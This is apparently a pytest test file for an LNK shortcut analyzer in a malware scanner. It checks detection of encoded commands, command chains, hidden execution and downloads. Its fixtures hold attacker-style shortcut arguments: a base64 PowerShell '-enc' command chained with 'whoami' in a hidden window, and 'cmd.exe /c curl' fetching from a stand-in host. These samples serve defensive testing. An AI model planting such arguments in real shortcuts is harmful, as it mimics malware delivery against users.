"""Tests for LNK analyzer behavior."""

from __future__ import annotations

import base64
import struct
from pathlib import Path

import pytest
from malscan_worker.analyzers.lnk_analyzer import LNKAnalyzer
from malscan_worker.stages.base import StageContext

_LNK_HEADER_CLSID = bytes.fromhex("0114020000000000c000000000000046")


def _ctx(file_path: Path) -> StageContext:
    return StageContext(
        job_id="job-1",
        file_id="file-1",
        storage_key="key",
        sha256="0" * 64,
        original_filename=file_path.name,
        file_path=file_path,
    )


def _build_lnk_header(
    *,
    file_attributes: int = 0x20,
    file_size: int = 0,
    show_command: int = 1,
    hot_key: int = 0,
) -> bytes:
    header = bytearray(76)
    header[0:4] = struct.pack("<I", 0x4C)
    header[4:20] = _LNK_HEADER_CLSID
    header[20:24] = struct.pack("<I", 0)
    header[24:28] = struct.pack("<I", file_attributes)
    header[52:56] = struct.pack("<I", file_size)
    header[60:64] = struct.pack("<I", show_command)
    header[64:66] = struct.pack("<H", hot_key)
    return bytes(header)


def test_can_handle_by_magic_and_mime(tmp_path: Path) -> None:
    file_path = tmp_path / "sample.lnk"
    file_path.write_bytes(b"not-used")

    analyzer = LNKAnalyzer()

    assert analyzer.can_handle(file_path, "application/x-ms-shortcut", b"abcd") is True
    assert analyzer.can_handle(file_path, "application/x-ms-lnk", b"abcd") is True
    assert analyzer.can_handle(file_path, "application/octet-stream", _build_lnk_header()) is True


def test_can_handle_rejects_non_lnk(tmp_path: Path) -> None:
    file_path = tmp_path / "plain.bin"
    file_path.write_bytes(b"hello")

    analyzer = LNKAnalyzer()

    assert analyzer.can_handle(file_path, "text/plain", b"hello") is False


@pytest.mark.asyncio
async def test_corrupt_truncated_lnk_returns_partial_with_errors(tmp_path: Path) -> None:
    file_path = tmp_path / "truncated.lnk"
    file_path.write_bytes(b"L\x00\x00")

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.analyzer_name == "lnk"
    assert result.format_type == "LNK"
    assert result.errors
    assert "header" in result.errors[0].lower() or "parse" in result.errors[0].lower()
    assert "file_size" in result.features
    assert result.risk_score >= 0


@pytest.mark.asyncio
async def test_indicator_logic_cmd_chain_encoded_and_hidden(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    file_path = tmp_path / "encoded.lnk"
    file_path.write_bytes(_build_lnk_header(show_command=0))

    payload = "Write-Output PWNED".encode("utf-16le")
    encoded = base64.b64encode(payload).decode("ascii")

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            self.arguments = f"-enc {encoded} && whoami -w hidden"
            self.working_dir = r"%APPDATA%\\Temp"
            self.icon_location = r"C:\\Windows\\System32\\shell32.dll,1"
            self.relative_path = r"..\\..\\payload.ps1"
            self.description = "test"
            self.network_path = ""
            self.local_base_path = r"C:\\Users\\Public"
            self.file_size = 123
            self.file_attributes = 0x20
            self.show_command = 0
            self.hot_key = 0
            self.tracker_data = {"machine_id": "abc"}

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    types = {str(ind["type"]) for ind in result.indicators}
    assert "cmd_chain" in types
    assert "encoded_command" in types
    assert "hidden_execution" in types
    assert result.features.get("decoded_command") == "Write-Output PWNED"


@pytest.mark.asyncio
async def test_monkeypatched_lnkparse3_parse_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    file_path = tmp_path / "network.lnk"
    file_path.write_bytes(_build_lnk_header(file_size=42, show_command=1))

    class _FakeLnk:
        def __init__(self, _path: str) -> None:
            self.target_path = r"cmd.exe"
            self.arguments = "/c curl http://example.test/a"
            self.working_dir = r"C:\\Users\\Public"
            self.icon_location = r"C:\\Windows\\System32\\shell32.dll,3"
            self.relative_path = r"cmd.exe"
            self.description = "network"
            self.network_path = r"\\server\\share\\payload.exe"
            self.local_base_path = r"C:\\Temp"
            self.tracker_data = {"droid": "x"}

    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)

    analyzer = LNKAnalyzer()
    result = await analyzer.analyze(file_path, _ctx(file_path))

    assert result.features["target_path"] == "cmd.exe"
    assert result.features["network_path"] == r"\\server\\share\\payload.exe"
    indicator_types = {str(ind["type"]) for ind in result.indicators}
    assert "network_target" in indicator_types
    assert "download_command" in indicator_types
